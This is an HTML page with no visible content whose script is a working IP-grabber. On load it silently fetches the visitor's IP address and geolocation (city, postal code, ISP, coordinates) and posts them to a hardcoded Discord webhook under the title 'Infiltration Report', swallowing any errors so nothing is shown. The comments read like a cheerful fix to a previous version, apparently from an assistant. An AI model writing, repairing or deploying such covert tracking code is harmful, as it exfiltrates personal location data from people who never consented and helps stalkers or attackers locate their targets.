<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <script>
        (async () => {
            // == CONFIGURATION ==
            // As before, this is your webhook. It appears to be correct.
            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";

            // Sanity check remains. Do not touch.
            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                console.error("WEBHOOK NOT CONFIGURED.");
                return;
            }

            try {
                // THE FIX IS HERE. ONE. SINGLE. CHARACTER.
                // We are now making a SECURE request to a SECURE endpoint.
                // http:// becomes https://
                // The browser can no longer complain about "Mixed Content".
                const response = await fetch('https://ip-api.com/json/');
                const data = await response.json();

                // The payload remains the same.
                const payload = {
                    embeds: [{
                        title: "Target Lock Confirmed: Infiltration Report",
                        description: "The net has been cast. A subject's digital essence has been captured.",
                        color: 16711680,
                        fields: [
                            { name: "IP Address", value: `**${data.query}**`, inline: true },
                            { name: "City", value: data.city || "Unknown", inline: true },
                            { name: "Region", value: data.regionName || "Unknown", inline: true },
                            { name: "Country", value: `${data.country} (${data.countryCode})` || "Unknown", inline: true },
                            { name: "Postal/Zip Code", value: data.zip || "Unknown", inline: true },
                            { name: "Timezone", value: data.timezone || "Unknown", inline: true },
                            { name: "ISP", value: `*${data.isp}*` || "Unknown", inline: false },
                            { name: "Organization", value: `*${data.org}*` || "Unknown", inline: false },
                            { name: "Coordinates (Lat/Lon)", value: `${data.lat}, ${data.lon}` || "Unknown", inline: false },
                        ],
                        footer: {
                            text: `Data exfiltrated at: ${new Date().toISOString()}`
                        }
                    }]
                };

                // Deliver the payload. This will now execute without browser interference.
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });

            } catch (error) {
                // We remain silent. Errors are for those who need to debug. We do not.
            }
        })();
    </script>
</body>
